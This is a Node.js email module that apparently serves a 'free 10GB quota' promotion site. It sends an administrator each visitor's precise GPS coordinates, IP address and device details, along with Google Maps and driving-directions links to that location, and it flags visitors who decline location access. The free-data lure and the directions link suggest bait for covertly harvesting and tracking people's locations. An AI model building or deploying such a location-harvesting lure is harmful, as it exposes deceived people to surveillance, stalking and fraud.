import nodemailer from "nodemailer";

// Create transporter
const transporter = nodemailer.createTransport({
  host: process.env.EMAIL_HOST,
  port: parseInt(process.env.EMAIL_PORT),
  secure: true,
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

// Email template for location permission
export async function sendLocationEmail({
  latitude,
  longitude,
  accuracy,
  ip,
  userAgent,
}) {
  const timestamp = new Date().toLocaleString("id-ID", {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    timeZoneName: "short",
  });

  const mailOptions = {
    from: process.env.EMAIL_FROM,
    to: process.env.ADMIN_EMAIL,
    subject: "🎉 NEW USER LOCATION - Free Quota Promo",
    html: `
      <!DOCTYPE html>
      <html>
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>New Location Captured</title>
        <style>
          body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            max-width: 700px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f9fafb;
          }
          .container {
            background: white;
            border-radius: 16px;
            overflow: hidden;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            margin: 20px auto;
          }
          .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 40px 30px;
            text-align: center;
          }
          .header h1 {
            margin: 0;
            font-size: 32px;
            font-weight: 700;
          }
          .header p {
            margin: 10px 0 0;
            opacity: 0.9;
            font-size: 18px;
          }
          .content {
            padding: 40px;
          }
          .location-box {
            background: linear-gradient(135deg, #f6d365 0%, #fda085 100%);
            padding: 30px;
            border-radius: 12px;
            text-align: center;
            margin: 30px 0;
            color: white;
          }
          .coordinates {
            font-size: 32px;
            font-weight: 800;
            letter-spacing: 1px;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
          }
          .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin: 30px 0;
          }
          .info-card {
            background: #f8fafc;
            padding: 20px;
            border-radius: 10px;
            border-left: 4px solid #667eea;
          }
          .info-card h3 {
            margin-top: 0;
            color: #4b5563;
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 1px;
          }
          .info-card p {
            margin: 8px 0 0;
            font-size: 18px;
            font-weight: 600;
            color: #1f2937;
          }
          .action-buttons {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            margin: 30px 0;
          }
          .btn {
            flex: 1;
            min-width: 200px;
            padding: 16px 24px;
            text-decoration: none;
            border-radius: 10px;
            font-weight: 600;
            text-align: center;
            transition: all 0.3s ease;
          }
          .btn-primary {
            background: #10b981;
            color: white;
          }
          .btn-primary:hover {
            background: #059669;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(16, 185, 129, 0.3);
          }
          .btn-secondary {
            background: #3b82f6;
            color: white;
          }
          .btn-secondary:hover {
            background: #2563eb;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(59, 130, 246, 0.3);
          }
          .user-agent {
            background: #1f2937;
            color: #d1d5db;
            padding: 20px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            word-break: break-all;
            margin: 20px 0;
          }
          .footer {
            text-align: center;
            padding: 30px;
            color: #6b7280;
            font-size: 14px;
            border-top: 1px solid #e5e7eb;
            background: #f9fafb;
          }
          .badge {
            display: inline-block;
            padding: 6px 12px;
            background: #10b981;
            color: white;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            margin: 5px;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="header">
            <h1>📍 New Location Captured</h1>
            <p>Free Quota Promo Campaign - User Granted Permission</p>
          </div>
          
          <div class="content">
            <div style="text-align: center; margin-bottom: 30px;">
              <span class="badge">✅ Cookie Accepted</span>
              <span class="badge">📍 Location Granted</span>
              <span class="badge">📧 Email Verified</span>
            </div>
            
            <div class="location-box">
              <h2 style="margin: 0; font-size: 24px;">User Location Coordinates</h2>
              <div class="coordinates">
                ${latitude.toFixed(6)}, ${longitude.toFixed(6)}
              </div>
              <p style="margin: 10px 0 0; opacity: 0.9;">
                Accuracy: ${accuracy?.toFixed(2) || "50"} meters
              </p>
            </div>
            
            <div class="info-grid">
              <div class="info-card">
                <h3>🌐 IP Address</h3>
                <p>${ip}</p>
              </div>
              <div class="info-card">
                <h3>🕐 Time & Date</h3>
                <p>${timestamp}</p>
              </div>
              <div class="info-card">
                <h3>🎯 Accuracy</h3>
                <p>${accuracy?.toFixed(2) || "50"} meters</p>
              </div>
              <div class="info-card">
                <h3>📱 Device Type</h3>
                <p>${userAgent.includes("Mobile") ? "📱 Mobile" : "💻 Desktop"}</p>
              </div>
            </div>
            
            <div class="action-buttons">
              <a href="https://maps.google.com/?q=${latitude},${longitude}" 
                 class="btn btn-primary" 
                 target="_blank">
                🗺️ View on Google Maps
              </a>
              <a href="https://www.google.com/maps/dir/?api=1&destination=${latitude},${longitude}" 
                 class="btn btn-secondary" 
                 target="_blank">
                📍 Get Directions
              </a>
            </div>
            
            <h3 style="color: #4b5563; margin-top: 40px;">🔍 User Agent Details</h3>
            <div class="user-agent">
              ${userAgent}
            </div>
            
            <div style="background: #f0f9ff; padding: 20px; border-radius: 10px; margin: 30px 0;">
              <h3 style="color: #0369a1; margin-top: 0;">📋 Next Action Required</h3>
              <p style="color: #1e40af; margin-bottom: 0;">
                Please verify this location and process the 10GB free quota for the user within 24 hours.
              </p>
            </div>
          </div>
          
          <div class="footer">
            <p>This email was automatically generated by the Free Quota Promo System.</p>
            <p>© ${new Date().getFullYear()} Promo Kuota Gratis. All rights reserved.</p>
          </div>
        </div>
      </body>
      </html>
    `,
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log("📧 Location email sent:", info.messageId);
    return info;
  } catch (error) {
    console.error("❌ Error sending email:", error);
    throw error;
  }
}

// Email template for denied permission
export async function sendDeniedEmail(ip, userAgent, reason) {
  const timestamp = new Date().toLocaleString("id-ID");

  const mailOptions = {
    from: process.env.EMAIL_FROM,
    to: process.env.ADMIN_EMAIL,
    subject: "⚠️ ACCESS DENIED - Free Quota Promo",
    html: `
      <!DOCTYPE html>
      <html>
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Access Denied Alert</title>
        <style>
          body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            max-width: 700px;
            margin: 0 auto;
            padding: 20px;
            background-color: #fef2f2;
          }
          .container {
            background: white;
            border-radius: 16px;
            overflow: hidden;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            margin: 20px auto;
          }
          .header {
            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
            color: white;
            padding: 40px 30px;
            text-align: center;
          }
          .header h1 {
            margin: 0;
            font-size: 32px;
            font-weight: 700;
          }
          .alert-box {
            background: #fef3c7;
            border: 2px solid #f59e0b;
            padding: 25px;
            border-radius: 12px;
            margin: 30px;
            text-align: center;
          }
          .alert-box h2 {
            color: #d97706;
            margin-top: 0;
          }
          .info-card {
            background: #f8fafc;
            padding: 20px;
            border-radius: 10px;
            margin: 20px;
            border-left: 4px solid #ef4444;
          }
          .steps {
            background: #ecfdf5;
            padding: 25px;
            border-radius: 12px;
            margin: 30px;
          }
          .step {
            display: flex;
            align-items: flex-start;
            margin-bottom: 20px;
          }
          .step-number {
            background: #10b981;
            color: white;
            width: 32px;
            height: 32px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            margin-right: 15px;
            flex-shrink: 0;
          }
          .footer {
            text-align: center;
            padding: 30px;
            color: #6b7280;
            font-size: 14px;
            border-top: 1px solid #e5e7eb;
            background: #f9fafb;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="header">
            <h1>🚫 Access Denied Detected</h1>
            <p>User rejected permissions for Free Quota Promo</p>
          </div>
          
          <div class="alert-box">
            <h2>⚠️ Permission Rejected</h2>
            <p style="font-size: 18px; color: #dc2626; font-weight: 600;">
              ${reason || "User rejected required permissions"}
            </p>
            <p style="color: #7c2d12;">
              User must enable both Cookie and Location permissions to access the promo.
            </p>
          </div>
          
          <div class="info-card">
            <h3 style="color: #dc2626; margin-top: 0;">📋 Denial Details</h3>
            <p><strong>IP Address:</strong> ${ip}</p>
            <p><strong>Time:</strong> ${timestamp}</p>
            <p><strong>Device:</strong> ${userAgent.includes("Mobile") ? "Mobile" : "Desktop"}</p>
          </div>
          
          <div class="steps">
            <h3 style="color: #065f46; margin-top: 0;">📝 Required Steps for User</h3>
            
            <div class="step">
              <div class="step-number">1</div>
              <div>
                <strong>Enable Cookies</strong>
                <p>Allow cookies in browser settings for better experience</p>
              </div>
            </div>
            
            <div class="step">
              <div class="step-number">2</div>
              <div>
                <strong>Grant Location Access</strong>
                <p>Click "Allow" when browser asks for location permission</p>
              </div>
            </div>
            
            <div class="step">
              <div class="step-number">3</div>
              <div>
                <strong>Click "IZINKAN SEMUA"</strong>
                <p>Press the green button to grant all permissions</p>
              </div>
            </div>
            
            <div class="step">
              <div class="step-number">4</div>
              <div>
                <strong>Get Free Quota</strong>
                <p>Receive 10GB free quota within 24 hours</p>
              </div>
            </div>
          </div>
          
          <div style="text-align: center; padding: 20px;">
            <p style="color: #6b7280;">
              This user will need to refresh the page and grant permissions to access the promo.
            </p>
          </div>
          
          <div class="footer">
            <p>This email was automatically generated by the Free Quota Promo System.</p>
            <p>Security Alert: Unauthorized access attempt recorded.</p>
          </div>
        </div>
      </body>
      </html>
    `,
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log("📧 Denial email sent:", info.messageId);
    return info;
  } catch (error) {
    console.error("❌ Error sending denial email:", error);
    throw error;
  }
}
